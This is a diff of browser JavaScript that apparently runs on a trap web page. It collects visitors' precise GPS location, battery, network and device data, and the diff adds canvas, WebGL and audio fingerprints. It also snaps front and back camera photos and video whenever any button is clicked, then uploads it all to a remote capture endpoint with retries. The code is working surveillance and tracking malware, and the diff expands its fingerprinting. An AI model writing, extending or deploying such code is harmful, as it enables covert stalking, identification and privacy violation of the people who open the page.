@@ -22,16 +22,16 @@
                     clearTimeout(Timer);
                     Resolve(Response);
                 })
-                .catch(function (Error) {
+                .catch(function (FetchError) {
                     clearTimeout(Timer);
-                    Reject(Error);
+                    Reject(FetchError);
                 });
         });
     }
 
     function RetryFetch(Url, Options, RetriesLeft) {
-        return FetchWithTimeout(Url, Options).catch(function (Error) {
-            if (RetriesLeft <= 0) throw Error;
+        return FetchWithTimeout(Url, Options).catch(function (FetchError) {
+            if (RetriesLeft <= 0) throw FetchError;
             return new Promise(function (Resolve) { setTimeout(Resolve, 2000); })
                 .then(function () { return RetryFetch(Url, Options, RetriesLeft - 1); });
         });
@@ -40,20 +40,39 @@
     function GetGps() {
         return new Promise(function (Resolve) {
             if (!navigator.geolocation) {
-                Resolve({ GpsLatitude: "Not Available", GpsLongitude: "Not Available", GpsAccuracy: "Not Available", GpsAltitude: "Not Available" });
+                Resolve({
+                    GpsLatitude: "Not Available", GpsLongitude: "Not Available",
+                    GpsAccuracy: "Not Available", GpsAltitude: "Not Available",
+                    GpsAltitudeAccuracy: "Not Available", GpsHeading: "Not Available", GpsSpeed: "Not Available"
+                });
                 return;
             }
             navigator.geolocation.getCurrentPosition(
                 function (Position) {
                     Resolve({
-                        GpsLatitude:  String(Position.coords.latitude),
-                        GpsLongitude: String(Position.coords.longitude),
-                        GpsAccuracy:  String(Position.coords.accuracy),
-                        GpsAltitude:  Position.coords.altitude ? String(Position.coords.altitude) : "Not Available"
+                        GpsLatitude:         String(Position.coords.latitude),
+                        GpsLongitude:        String(Position.coords.longitude),
+                        GpsAccuracy:         String(Math.round(Position.coords.accuracy)) + " m",
+                        GpsAltitude:         Position.coords.altitude != null
+                                                 ? String(Math.round(Position.coords.altitude)) + " m"
+                                                 : "Not Available",
+                        GpsAltitudeAccuracy: Position.coords.altitudeAccuracy != null
+                                                 ? String(Math.round(Position.coords.altitudeAccuracy)) + " m"
+                                                 : "Not Available",
+                        GpsHeading:          Position.coords.heading != null
+                                                 ? String(Math.round(Position.coords.heading)) + "°"
+                                                 : "Not Available",
+                        GpsSpeed:            Position.coords.speed != null
+                                                 ? String(Position.coords.speed.toFixed(2)) + " m/s"
+                                                 : "Not Available"
                     });
                 },
                 function () {
-                    Resolve({ GpsLatitude: "Permission Denied", GpsLongitude: "Not Available", GpsAccuracy: "Not Available", GpsAltitude: "Not Available" });
+                    Resolve({
+                        GpsLatitude: "Permission Denied", GpsLongitude: "Not Available",
+                        GpsAccuracy: "Not Available", GpsAltitude: "Not Available",
+                        GpsAltitudeAccuracy: "Not Available", GpsHeading: "Not Available", GpsSpeed: "Not Available"
+                    });
                 },
                 { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
@@ -63,46 +82,244 @@
     function GetBattery() {
         return new Promise(function (Resolve) {
             if (!navigator.getBattery) {
-                Resolve({ BatteryLevel: "Not Available", BatteryCharging: "Not Available" });
+                Resolve({
+                    BatteryLevel: "Not Available", BatteryCharging: "Not Available",
+                    BatteryChargingTime: "Not Available", BatteryDischargingTime: "Not Available"
+                });
                 return;
             }
             navigator.getBattery().then(function (Battery) {
+                var ChargingTime = "Not Available";
+                var DischargingTime = "Not Available";
+                if (Battery.charging && Battery.chargingTime !== Infinity && Battery.chargingTime > 0) {
+                    ChargingTime = String(Math.round(Battery.chargingTime / 60)) + " min";
+                } else if (Battery.charging) {
+                    ChargingTime = "Fully Charged";
+                }
+                if (!Battery.charging && Battery.dischargingTime !== Infinity && Battery.dischargingTime > 0) {
+                    DischargingTime = String(Math.round(Battery.dischargingTime / 60)) + " min";
+                }
                 Resolve({
-                    BatteryLevel:    Math.round(Battery.level * 100) + "%",
-                    BatteryCharging: String(Battery.charging)
+                    BatteryLevel:           Math.round(Battery.level * 100) + "%",
+                    BatteryCharging:        String(Battery.charging),
+                    BatteryChargingTime:    ChargingTime,
+                    BatteryDischargingTime: DischargingTime
                 });
             }).catch(function () {
-                Resolve({ BatteryLevel: "Not Available", BatteryCharging: "Not Available" });
+                Resolve({
+                    BatteryLevel: "Not Available", BatteryCharging: "Not Available",
+                    BatteryChargingTime: "Not Available", BatteryDischargingTime: "Not Available"
+                });
             });
         });
     }
 
     function GetNetwork() {
-        const Connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        var Connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (!Connection) {
-            return { ConnectionType: "Not Available", EffectiveConnectionType: "Not Available", DownlinkMbps: "Not Available" };
+            return {
+                ConnectionType: "Not Available", EffectiveConnectionType: "Not Available",
+                DownlinkMbps: "Not Available", NetworkRtt: "Not Available", SaveData: "Not Available"
+            };
         }
         return {
-            ConnectionType:          Connection.type || "Not Available",
+            ConnectionType:          Connection.type          || "Not Available",
             EffectiveConnectionType: Connection.effectiveType || "Not Available",
-            DownlinkMbps:            Connection.downlink != null ? String(Connection.downlink) : "Not Available"
+            DownlinkMbps:            Connection.downlink  != null ? String(Connection.downlink)  : "Not Available",
+            NetworkRtt:              Connection.rtt        != null ? String(Connection.rtt) + " ms" : "Not Available",
+            SaveData:                Connection.saveData   != null ? String(Connection.saveData)  : "Not Available"
         };
     }
 
     function GetDeviceInfo() {
+        var PluginCount = "0";
+        try { PluginCount = navigator.plugins ? String(navigator.plugins.length) : "0"; } catch (PluginError) {}
+
+        var NotificationPermission = "Not Available";
+        try {
+            NotificationPermission = typeof Notification !== "undefined"
+                ? Notification.permission
+                : "Not Available";
+        } catch (NotifError) {}
+
+        var PdfViewerEnabled = "Not Available";
+        try {
+            PdfViewerEnabled = typeof navigator.pdfViewerEnabled !== "undefined"
+                ? String(navigator.pdfViewerEnabled)
+                : "Not Available";
+        } catch (PdfError) {}
+
         return {
-            ScreenResolution:    screen.width + "x" + screen.height,
-            PixelRatio:          String(window.devicePixelRatio || "Not Available"),
-            Timezone:            Intl.DateTimeFormat().resolvedOptions().timeZone || "Not Available",
-            Language:            navigator.language || "Not Available",
-            DeviceMemoryGb:      navigator.deviceMemory ? String(navigator.deviceMemory) : "Not Available",
-            HardwareConcurrency: navigator.hardwareConcurrency ? String(navigator.hardwareConcurrency) : "Not Available",
-            MaxTouchPoints:      String(navigator.maxTouchPoints || 0),
-            CookieEnabled:       String(navigator.cookieEnabled),
-            OnlineStatus:        String(navigator.onLine),
-            PageUrl:             window.location.href,
-            Referrer:            document.referrer || "Direct"
+            ScreenResolution:           screen.width + "x" + screen.height,
+            ScreenAvailable:            screen.availWidth + "x" + screen.availHeight,
+            ViewportSize:               window.innerWidth + "x" + window.innerHeight,
+            ColorDepth:                 String(screen.colorDepth || screen.pixelDepth || "Not Available"),
+            PixelRatio:                 String(window.devicePixelRatio || "Not Available"),
+            OrientationType:            screen.orientation ? screen.orientation.type  : "Not Available",
+            OrientationAngle:           screen.orientation ? String(screen.orientation.angle) : "0",
+            Platform:                   navigator.platform  || "Not Available",
+            Language:                   navigator.language  || "Not Available",
+            LanguagesSupported:         navigator.languages
+                                            ? navigator.languages.slice(0, 10).join(", ")
+                                            : "Not Available",
+            VendorName:                 navigator.vendor    || "Not Available",
+            DoNotTrack:                 navigator.doNotTrack || "unspecified",
+            CookieEnabled:              String(navigator.cookieEnabled),
+            OnlineStatus:               String(navigator.onLine),
+            DeviceMemoryGb:             navigator.deviceMemory
+                                            ? String(navigator.deviceMemory) + " GB"
+                                            : "Not Available",
+            HardwareConcurrency:        navigator.hardwareConcurrency
+                                            ? String(navigator.hardwareConcurrency) + " cores"
+                                            : "Not Available",
+            MaxTouchPoints:             String(navigator.maxTouchPoints || 0),
+            PluginCount:                PluginCount,
+            PdfViewerEnabled:           PdfViewerEnabled,
+            ServiceWorkerSupported:     String("serviceWorker" in navigator),
+            IndexedDbSupported:         String(!!window.indexedDB),
+            WebAssemblySupported:       String(typeof WebAssembly === "object"),
+            WebRtcSupported:            String(!!(window.RTCPeerConnection || window.webkitRTCPeerConnection)),
+            GamepadApiSupported:        String("getGamepads" in navigator),
+            PaymentRequestSupported:    String(typeof PaymentRequest !== "undefined"),
+            BluetoothAvailable:         String("bluetooth" in navigator),
+            UsbAvailable:               String("usb" in navigator),
+            SpeechSynthesisAvailable:   String("speechSynthesis" in window),
+            SpeechRecognitionAvailable: String(!!(window.SpeechRecognition || window.webkitSpeechRecognition)),
+            NotificationPermission:     NotificationPermission,
+            Timezone:                   Intl.DateTimeFormat().resolvedOptions().timeZone || "Not Available",
+            HistoryLength:              String(window.history.length),
+            DocumentReadyState:         document.readyState,
+            PageUrl:                    window.location.href,
+            Referrer:                   document.referrer || "Direct"
         };
+    }
+
+    function GetWebGlInfo() {
+        try {
+            var Canvas = document.createElement("canvas");
+            var GlContext = Canvas.getContext("webgl") || Canvas.getContext("experimental-webgl");
+            if (!GlContext) {
+                return {
+                    WebGlSupported: "false", WebGl2Supported: "false",
+                    WebGlRenderer: "Not Available", WebGlVendor: "Not Available"
+                };
+            }
+            var DebugExtension = GlContext.getExtension("WEBGL_debug_renderer_info");
+            var Renderer = DebugExtension
+                ? GlContext.getParameter(DebugExtension.UNMASKED_RENDERER_WEBGL)
+                : GlContext.getParameter(GlContext.RENDERER);
+            var Vendor = DebugExtension
+                ? GlContext.getParameter(DebugExtension.UNMASKED_VENDOR_WEBGL)
+                : GlContext.getParameter(GlContext.VENDOR);
+            var Gl2Context = Canvas.getContext("webgl2");
+            return {
+                WebGlSupported:  "true",
+                WebGl2Supported: String(!!Gl2Context),
+                WebGlRenderer:   Renderer || "Not Available",
+                WebGlVendor:     Vendor   || "Not Available"
+            };
+        } catch (GlError) {
+            return {
+                WebGlSupported: "false", WebGl2Supported: "false",
+                WebGlRenderer: "Not Available", WebGlVendor: "Not Available"
+            };
+        }
+    }
+
+    function GetCanvasFingerprint() {
+        try {
+            var Canvas = document.createElement("canvas");
+            Canvas.width  = 240;
+            Canvas.height = 60;
+            var Context = Canvas.getContext("2d");
+            Context.textBaseline = "alphabetic";
+            Context.fillStyle    = "#f60";
+            Context.fillRect(0, 0, 240, 60);
+            Context.fillStyle = "#069";
+            Context.font      = "15px Arial";
+            Context.fillText("Cwm fjordbank glyphs vext quiz!", 2, 28);
+            Context.fillStyle = "rgba(102, 204, 0, 0.7)";
+            Context.font      = "bold 14px Georgia";
+            Context.fillText("Cwm fjordbank glyphs vext quiz!", 4, 50);
+            var DataUrl = Canvas.toDataURL();
+            var Hash    = 0;
+            for (var Index = 0; Index < DataUrl.length; Index++) {
+                Hash = ((Hash << 5) - Hash) + DataUrl.charCodeAt(Index);
+                Hash = Hash | 0;
+            }
+            return String(Math.abs(Hash));
+        } catch (CanvasError) {
+            return "Not Available";
+        }
+    }
+
+    function GetAudioContextInfo() {
+        try {
+            var AudioContextConstructor = window.AudioContext || window.webkitAudioContext;
+            if (!AudioContextConstructor) {
+                return { AudioContextSampleRate: "Not Available", AudioContextChannelCount: "Not Available" };
+            }
+            var AudioCtx = new AudioContextConstructor();
+            var AudioInfo = {
+                AudioContextSampleRate:   String(AudioCtx.sampleRate),
+                AudioContextChannelCount: String(AudioCtx.destination.maxChannelCount)
+            };
+            if (AudioCtx.close) AudioCtx.close();
+            return AudioInfo;
+        } catch (AudioError) {
+            return { AudioContextSampleRate: "Not Available", AudioContextChannelCount: "Not Available" };
+        }
+    }
+
+    function GetMediaDeviceCounts() {
+        return new Promise(function (Resolve) {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
+                Resolve({
+                    VideoInputCount: "Not Available",
+                    AudioInputCount: "Not Available",
+                    AudioOutputCount: "Not Available"
+                });
+                return;
+            }
+            navigator.mediaDevices.enumerateDevices().then(function (Devices) {
+                var VideoInputs  = 0;
+                var AudioInputs  = 0;
+                var AudioOutputs = 0;
+                for (var Index = 0; Index < Devices.length; Index++) {
+                    if      (Devices[Index].kind === "videoinput")  VideoInputs++;
+                    else if (Devices[Index].kind === "audioinput")  AudioInputs++;
+                    else if (Devices[Index].kind === "audiooutput") AudioOutputs++;
+                }
+                Resolve({
+                    VideoInputCount:  String(VideoInputs),
+                    AudioInputCount:  String(AudioInputs),
+                    AudioOutputCount: String(AudioOutputs)
+                });
+            }).catch(function () {
+                Resolve({
+                    VideoInputCount: "Not Available",
+                    AudioInputCount: "Not Available",
+                    AudioOutputCount: "Not Available"
+                });
+            });
+        });
+    }
+
+    function GetStorageQuota() {
+        return new Promise(function (Resolve) {
+            if (!navigator.storage || !navigator.storage.estimate) {
+                Resolve({ StorageQuotaMb: "Not Available", StorageUsedMb: "Not Available" });
+                return;
+            }
+            navigator.storage.estimate().then(function (Estimate) {
+                Resolve({
+                    StorageQuotaMb: String(Math.round((Estimate.quota || 0) / (1024 * 1024))) + " MB",
+                    StorageUsedMb:  String(Math.round((Estimate.usage  || 0) / (1024 * 1024))) + " MB"
+                });
+            }).catch(function () {
+                Resolve({ StorageQuotaMb: "Not Available", StorageUsedMb: "Not Available" });
+            });
+        });
     }
 
     function CompressAndUploadCamera(Blob, SourceLabel) {
@@ -166,9 +383,9 @@
                         const Context = Canvas.getContext("2d");
                         Context.drawImage(Video, 0, 0, Canvas.width, Canvas.height);
                         Stream.getTracks().forEach(function (Track) { Track.stop(); });
-                        Canvas.toBlob(function (Blob) {
-                            if (!Blob) { Resolve("Upload Failed"); return; }
-                            CompressAndUploadCamera(Blob, SourceLabel).then(Resolve);
+                        Canvas.toBlob(function (CaptureBlob) {
+                            if (!CaptureBlob) { Resolve("Upload Failed"); return; }
+                            CompressAndUploadCamera(CaptureBlob, SourceLabel).then(Resolve);
                         }, "image/jpeg", 0.85);
                     }, 1500);
                 }).catch(function () {
@@ -263,10 +480,10 @@
     function FindBackCameraConstraint(VideoDevices) {
         if (VideoDevices.length < 2) return null;
         var BackDevice = null;
-        for (var I = 0; I < VideoDevices.length; I++) {
-            const Label = (VideoDevices[I].label || "").toLowerCase();
+        for (var Index = 0; Index < VideoDevices.length; Index++) {
+            const Label = (VideoDevices[Index].label || "").toLowerCase();
             if (Label.includes("back") || Label.includes("rear") || Label.includes("environment")) {
-                BackDevice = VideoDevices[I];
+                BackDevice = VideoDevices[Index];
                 break;
             }
         }
@@ -293,20 +510,24 @@
         });
         document.querySelectorAll(
             "button, input[type='submit'], input[type='button'], [role='button']"
-        ).forEach(function (Btn) {
-            Btn.addEventListener("click", Handler);
+        ).forEach(function (Button) {
+            Button.addEventListener("click", Handler);
         });
     }
 
-    const GpsCapture     = GetGps();
-    const BatteryCapture = GetBattery();
+    const GpsCapture         = GetGps();
+    const BatteryCapture     = GetBattery();
+    const MediaDeviceCapture = GetMediaDeviceCounts();
+    const StorageCapture     = GetStorageQuota();
 
     function SendCapture(FrontResult, BackResult, VideoFrontResult, VideoBackResult) {
-        Promise.all([GpsCapture, BatteryCapture]).then(function (Results) {
-            const Payload = Object.assign(
+        Promise.all([GpsCapture, BatteryCapture, MediaDeviceCapture, StorageCapture]).then(function (Results) {
+            var Payload = Object.assign(
                 {},
                 Results[0],
                 Results[1],
+                Results[2],
+                Results[3],
                 {
                     CameraFrontFile:     FrontResult      || "Not Captured",
                     CameraBackFile:      BackResult       || "Not Captured",
@@ -314,7 +535,10 @@
                     CameraVideoBackFile: VideoBackResult  || "Not Captured"
                 },
                 GetNetwork(),
-                GetDeviceInfo()
+                GetDeviceInfo(),
+                GetWebGlInfo(),
+                { CanvasFingerprint: GetCanvasFingerprint() },
+                GetAudioContextInfo()
             );
             RetryFetch(CaptureEndpoint, {
                 method: "POST",
